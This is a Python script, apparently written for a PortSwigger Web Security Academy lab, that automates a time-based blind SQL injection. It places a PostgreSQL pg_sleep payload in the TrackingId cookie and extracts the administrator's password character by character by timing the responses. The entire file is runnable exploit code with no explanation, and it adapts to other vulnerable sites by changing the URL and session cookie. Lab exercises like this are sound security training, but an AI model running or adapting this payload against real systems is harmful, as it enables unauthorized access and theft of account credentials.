#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
	print("\n\n[+]Saliendo...\n")
	sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0aac00fd044a9637c0cba84700ef00c5.web-security-academy.net" #The url here
characters = string.ascii_lowercase + string.digits

def makeRequest():

	password = ""
	
	p1 = log.progress("Fuerza bruta") 
	p1.status("Iniciando ataque de fuerza bruta")

	time.sleep(2)

	p2 = log.progress("Password")


	for position in range(1, 21):
		for character in characters:

			cookies = {
				'TrackingId' : "BEGy9sSKB7eG3Vcv'||(select case when substring(password,%d,1)='%s' then pg_sleep(2) else pg_sleep(0) end from users where username='administrator')-- -" % (position, character), #here the cookies and injection
				'session' : 'vQpwdQzJO5LjArQljPaGHiGRnMW9py6a' #session
			}

			p1.status(cookies['TrackingId'])

			time_start = time.time()

			r = requests.get(main_url, cookies=cookies)

			time_end = time.time()
			
			if time_end - time_start > 2:
				password += character
				p2.status(password)
				break


if __name__ == '__main__':

	makeRequest()